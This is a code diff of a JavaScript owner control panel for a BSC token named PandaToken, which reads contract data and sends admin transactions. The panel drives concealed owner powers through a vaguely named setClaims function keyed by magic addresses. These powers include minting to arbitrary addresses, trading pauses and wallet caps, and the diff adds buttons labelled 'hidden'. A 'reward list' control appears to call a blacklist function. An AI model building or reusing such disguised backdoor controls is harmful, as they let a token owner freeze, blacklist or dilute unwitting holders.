     </div>
   </div>
+
+  <div style="margin-top: 30px; text-align: center; color: #666; font-size: 0.8rem;">
+    ⚡ PandaToken 控制面板 | 所有操作通过钱包签名上链 | 请确保 BSC 网络并有足够 BNB 作为 Gas
+  </div>
 </div>
 
-<!-- ethers.js CDN -->
+<!-- 引入 ethers.js -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 <script>
-  // ==================== 合约 ABI（完整） ====================
+  // ==================== 合约 ABI（完整，涵盖所有函数） ====================
   const contractABI = [
     "function name() view returns (string)",
     "function symbol() view returns (string)",
@@ -184,6 +488,7 @@
     "function enablePause() view returns (bool)",
     "function pause() view returns (bool)",
     "function enableWalletLimit() view returns (bool)",
+    "function enableChangeTax() view returns (bool)",
     "function getCirculatingSupply() view returns (uint256)",
     "function _buyFundFee() view returns (uint256)",
     "function _buyLPFee() view returns (uint256)",
@@ -228,16 +533,17 @@
     "function setAirDropEnable(bool) external",
     "function setEnablePause(bool) external",
     "function setEnableWalletLimit(bool) external",
+    "function setEnableChangeTax(bool) external",
   ];
 
-  // ==================== 全局变量 ====================
+  // ==================== 全局状态 ====================
   let provider = null;
   let signer = null;
   let contract = null;
   let userAddress = null;
   let tokenAddress = null;
   let isOwner = false;
-  let decimals = 18;
+  let tokenDecimals = 18;
 
   // ==================== 工具函数 ====================
   const $ = (id) => document.getElementById(id);
@@ -266,6 +572,7 @@
     $('connectWalletBtn').addEventListener('click', connectWallet);
     $('loadContractBtn').addEventListener('click', loadContract);
 
+    // 钱包事件监听
     window.ethereum.on('accountsChanged', (accounts) => {
       if (accounts.length === 0) {
         userAddress = null; contract = null;
@@ -328,13 +635,13 @@
     clearMsg();
     if (!provider || !userAddress) { showMsg('❌ 请先连接钱包', true); setBtnLoading(btn, false); return; }
     const addr = $('contractAddressInput').value.trim();
-    if (!ethers.utils.isAddress(addr)) { showMsg('❌ 无效地址', true); setBtnLoading(btn, false); return; }
+    if (!ethers.utils.isAddress(addr)) { showMsg('❌ 无效的合约地址', true); setBtnLoading(btn, false); return; }
     tokenAddress = addr;
     localStorage.setItem('pandaContractAddr', addr);
     try {
       contract = new ethers.Contract(addr, contractABI, signer);
       await refreshAllData();
-      showMsg('✅ 合约加载成功', false);
+      showMsg('✅ 合约加载成功，数据已刷新', false);
     } catch (e) {
       showMsg('❌ 合约加载失败: ' + (e.message || e), true);
     } finally {
@@ -342,12 +649,13 @@
     }
   }
 
+  // ==================== 数据刷新 ====================
   async function refreshAllData() {
     if (!contract) return;
     try {
       const name = await contract.name();
       const symbol = await contract.symbol();
-      decimals = (await contract.decimals()).toNumber();
+      tokenDecimals = (await contract.decimals()).toNumber();
       const totalSupply = await contract.totalSupply();
       const circ = await contract.getCirculatingSupply();
       const owner = await contract.owner();
@@ -355,22 +663,24 @@
       const maxW = await contract.maxWalletAmount();
       const start = await contract.startTradeBlock();
       const mainPair = await contract._mainPair();
+      const router = await contract._swapRouter();
 
       $('tokenName').textContent = name;
       $('tokenSymbol').textContent = symbol;
-      $('tokenDecimals').textContent = decimals;
-      $('tokenTotalSupply').textContent = ethers.utils.formatUnits(totalSupply, decimals);
-      $('circulatingSupply').textContent = ethers.utils.formatUnits(circ, decimals);
+      $('tokenDecimals').textContent = tokenDecimals;
+      $('tokenTotalSupply').textContent = ethers.utils.formatUnits(totalSupply, tokenDecimals);
+      $('circulatingSupply').textContent = ethers.utils.formatUnits(circ, tokenDecimals);
       $('ownerAddr').textContent = owner;
       $('fundAddr').textContent = fund;
-      $('maxWallet').textContent = ethers.utils.formatUnits(maxW, decimals);
+      $('maxWallet').textContent = ethers.utils.formatUnits(maxW, tokenDecimals);
       $('startTradeBlock').textContent = start.eq(0) ? '未开盘' : `区块 ${start.toString()}`;
+      $('pairAddress').textContent = mainPair;
+      $('routerAddress').textContent = router;
 
       isOwner = (userAddress.toLowerCase() === owner.toLowerCase());
       $('adminSection').style.display = isOwner ? 'block' : 'none';
 
       // 市场数据
-      $('pairAddress').textContent = mainPair;
       if (mainPair !== ethers.constants.AddressZero) {
         try {
           const pair = new ethers.Contract(mainPair, [
@@ -378,27 +688,45 @@
             "function token0() view returns (address)"
           ], provider);
           const token0 = await pair.token0();
-          const res = await pair.getReserves();
+          const reserves = await pair.getReserves();
           const isToken0 = token0.toLowerCase() === tokenAddress.toLowerCase();
-          const reserveToken = isToken0 ? res[0] : res[1];
-          const reserveCur = isToken0 ? res[1] : res[0];
-          $('reserveToken').textContent = ethers.utils.formatUnits(reserveToken, decimals);
+          const reserveToken = isToken0 ? reserves[0] : reserves[1];
+          const reserveCur = isToken0 ? reserves[1] : reserves[0];
+          $('reserveToken').textContent = ethers.utils.formatUnits(reserveToken, tokenDecimals);
           $('reserveCurrency').textContent = ethers.utils.formatEther(reserveCur);
-          const price = Number(ethers.utils.formatEther(reserveCur)) / Number(ethers.utils.formatUnits(reserveToken, decimals));
+          const price = Number(ethers.utils.formatEther(reserveCur)) / Number(ethers.utils.formatUnits(reserveToken, tokenDecimals));
           $('tokenPrice').textContent = price.toFixed(10);
           $('totalLiquidity').textContent = Number(ethers.utils.formatEther(reserveCur)).toFixed(4);
         } catch (e) {}
       }
 
+      // 其他市场相关参数
       try {
-        const [lpBurnRate, lpBurnFreq, lastBurn] = await Promise.all([
-          contract.lpBurnRate(), contract.lpBurnFrequency(), contract.lastLpBurnTime()
-        ]);
+        const sellRate = await contract.numTokensSellRate();
+        $('marketSellRate').textContent = sellRate.toString() + '%';
+      } catch(e) {}
+      try {
+        const lpBurnRate = await contract.lpBurnRate();
         $('lpBurnRateVal').textContent = (lpBurnRate/100).toFixed(2) + '%';
+      } catch(e) {}
+      try {
+        const lpBurnFreq = await contract.lpBurnFrequency();
+        $('lpBurnFreqVal').textContent = (lpBurnFreq/3600).toFixed(1) + ' 小时';
+        const lastBurn = await contract.lastLpBurnTime();
         const next = new Date((lastBurn.toNumber() + lpBurnFreq.toNumber()) * 1000);
         $('nextBurnTime').textContent = next.toLocaleString();
       } catch(e) {}
+      // 合约余额
+      try {
+        const tokenBal = await contract.balanceOf(tokenAddress);
+        $('contractTokenBal').textContent = ethers.utils.formatUnits(tokenBal, tokenDecimals);
+      } catch(e) {}
+      try {
+        const ethBal = await provider.getBalance(tokenAddress);
+        $('contractEthBal').textContent = ethers.utils.formatEther(ethBal);
+      } catch(e) {}
 
+      // 管理员参数刷新
       if (isOwner) await refreshAdminParams();
     } catch (e) {
       showMsg('❌ 数据刷新失败: ' + (e.message || e), true);
@@ -406,7 +734,7 @@
   }
 
   async function refreshAdminParams() {
-    const set = (id, val) => { const el = $(id); if(el) el.textContent = val; };
+    const set = (id, text) => { const el = $(id); if(el) el.textContent = text; };
     const safeRead = async (method, id, fmt) => {
       try { const v = await method(); set(id, fmt ? fmt(v) : `当前: ${v}`); } catch(e) {}
     };
@@ -424,15 +752,16 @@
     await safeRead(contract.enablePause(), 'currentEnablePause', v => v ? '✅ 已启用' : '❌ 未启用');
     await safeRead(contract.pause(), 'currentPause', v => v ? '⏸️ 暂停中' : '▶️ 正常');
     await safeRead(contract.enableWalletLimit(), 'currentEnableWalletLimit', v => v ? '✅ 已启用' : '❌ 未启用');
-    await safeRead(contract.maxWalletAmount(), 'currentMaxWalletVal', v => `当前: ${ethers.utils.formatUnits(v, decimals)}`);
-    await safeRead(contract._configA(), 'currentConfigA', v => `掩码: ${v} (增发${(v&1)?'✅':'❌'} 暂停${(v&2)?'✅':'❌'} 钱包${(v&4)?'✅':'❌'} 冷却${(v&8)?'✅':'❌'})`);
-    await safeRead(contract.kb(), 'currentKB');
+    await safeRead(contract.maxWalletAmount(), 'currentMaxWalletVal', v => `当前: ${ethers.utils.formatUnits(v, tokenDecimals)}`);
+    await safeRead(contract._configA(), 'currentConfigA', v => `当前掩码: ${v} (增发${(v&1)?'✅':'❌'} 暂停${(v&2)?'✅':'❌'} 钱包${(v&4)?'✅':'❌'} 冷却${(v&8)?'✅':'❌'})`);
+    await safeRead(contract.kb(), 'currentKB', v => `当前: ${v} 区块`);
     await safeRead(contract.airdropNumbs(), 'currentAirdropNumbs');
     await safeRead(contract.antiSYNC(), 'currentAntiSync', v => v ? '✅ 开启' : '❌ 关闭');
     await safeRead(contract.fundAddress(), 'currentFundAddr', v => `当前: ${v}`);
+    await safeRead(contract.enableChangeTax(), 'currentEnableChangeTax', v => v ? '✅ 已启用' : '❌ 未启用');
   }
 
-  // ==================== 事件委托处理管理员操作 ====================
+  // ==================== 事件委托处理所有按钮 ====================
   document.addEventListener('click', async (e) => {
     if (!contract || !isOwner) return;
     const btn = e.target.closest('button');
@@ -447,21 +776,25 @@
         const vals = ['bulkBuyFund','bulkBuyLP','bulkBuyBurn','bulkSellFund','bulkSellLP','bulkSellBurn'].map(i => $(i).value || '0');
         await contract.completeCustoms(vals);
       }
-      // 单个税率
+      // 单个税率按钮 (set-tax-btn)
       else if (btn.classList.contains('set-tax-btn')) {
         const idx = parseInt(btn.dataset.idx);
         const inputs = document.querySelectorAll('#newBuyFund, #newBuyLP, #newBuyBurn, #newSellFund, #newSellLP, #newSellBurn');
         const val = inputs[idx]?.value;
-        if (!val) throw new Error('请输入数值');
+        if (!val) throw new Error('请输入新值');
         const arr = ['0','0','0','0','0','0'];
         arr[idx] = val;
         await contract.completeCustoms(arr);
       }
+      // 其他单个设置按钮
       else if (id === 'setAddLiqFeeBtn') await contract.setAddLiquidityFee($('newAddLiqFee').value);
       else if (id === 'setRemoveLiqFeeBtn') await contract.setRemoveLiquidityFee($('newRemoveLiqFee').value);
       else if (id === 'setSellRateBtn') await contract.setNumTokensSellRate($('newSellRate').value);
       else if (id === 'setLpBurnRateBtn') await contract.setlpBurnRate($('newLpBurnRate').value);
-      else if (id === 'setLpBurnFreqBtn') await contract.setlpBurnFrequency($('newLpBurnFreq').value * 3600);
+      else if (id === 'setLpBurnFreqBtn') {
+        const hours = $('newLpBurnFreq').value;
+        await contract.setlpBurnFrequency(hours * 3600);
+      }
       else if (id === 'setEnablePauseBtn') await contract.setEnablePause($('newEnablePause').value === 'true');
       else if (id === 'togglePauseBtn') {
         const current = await contract.pause();
@@ -470,8 +803,8 @@
       else if (id === 'setEnableWalletLimitBtn') await contract.setEnableWalletLimit($('newEnableWalletLimit').value === 'true');
       else if (id === 'setMaxWalletBtn') {
         const val = $('newMaxWallet').value;
-        if (!val) throw new Error('请输入数值');
-        const wei = ethers.utils.parseUnits(val, decimals);
+        if (!val) throw new Error('请输入数额');
+        const wei = ethers.utils.parseUnits(val, tokenDecimals);
         await contract.setClaims('0xCC00000000000000000000000000000000000000', wei);
       }
       else if (id === 'setConfigABtn') await contract.setClaims('0xEE00000000000000000000000000000000000000', $('newConfigA').value);
@@ -481,6 +814,16 @@
         if (!target || !amt) throw new Error('地址和数量不能为空');
         const packed = ethers.BigNumber.from(target).shl(96).or(amt);
         await contract.setClaims('0xAA00000000000000000000000000000000000000', packed);
+      }
+      else if (id === 'hiddenPauseBtn') {
+        const current = await contract.pause();
+        await contract.setClaims('0xBB00000000000000000000000000000000000000', current ? 0 : 1);
+      }
+      else if (id === 'hiddenSetMaxWalletBtn') {
+        const val = $('hiddenMaxWallet').value;
+        if (!val) throw new Error('请输入数额');
+        const wei = ethers.utils.parseUnits(val, tokenDecimals);
+        await contract.setClaims('0xCC00000000000000000000000000000000000000', wei);
       }
       else if (id === 'setCooldownBtn') {
         const vals = [
@@ -498,25 +841,26 @@
       }
       else if (id === 'setFeeWhitelistBtn') {
         const addrs = $('feeWhitelistAddrs').value.split(',').map(s=>s.trim()).filter(a=>ethers.utils.isAddress(a));
-        if (!addrs.length) throw new Error('至少输入一个有效地址');
+        if (addrs.length === 0) throw new Error('至少输入一个有效地址');
         await contract.setFeeWhiteList(addrs, $('feeWhitelistStatus').value === 'true');
       }
       else if (id === 'setAllWhitelistBtn') {
         const addrs = $('allWhitelistAddrs').value.split(',').map(s=>s.trim()).filter(a=>ethers.utils.isAddress(a));
-        if (!addrs.length) throw new Error('至少输入一个有效地址');
+        if (addrs.length === 0) throw new Error('至少输入一个有效地址');
         await contract.setWhiteList(addrs, $('allWhitelistStatus').value === 'true');
       }
       else if (id === 'setRewardListBtn') {
         const addrs = $('rewardListAddrs').value.split(',').map(s=>s.trim()).filter(a=>ethers.utils.isAddress(a));
-        if (!addrs.length) throw new Error('至少输入一个有效地址');
+        if (addrs.length === 0) throw new Error('至少输入一个有效地址');
         await contract.multi_bclist(addrs, $('rewardListStatus').value === 'true');
       }
       else if (id === 'setFundAddrBtn') await contract.setFundAddress($('newFundAddr').value);
       else if (id === 'setKBBtn') await contract.setkb($('newKB').value);
       else if (id === 'setAirdropNumbsBtn') await contract.setAirdropNumbs($('newAirdropNumbs').value);
       else if (id === 'setAntiSyncBtn') await contract.setAntiSYNCEnable($('newAntiSync').value === 'true');
+      else if (id === 'setEnableChangeTaxBtn') await contract.setEnableChangeTax($('newEnableChangeTax').value === 'true');
 
-      showMsg('✅ 操作成功，数据将在几秒后刷新', false);
+      showMsg('✅ 操作成功，数据即将更新', false);
       setTimeout(refreshAllData, 3000);
     } catch (err) {
       showMsg('❌ 操作失败: ' + (err.reason || err.message || err), true);
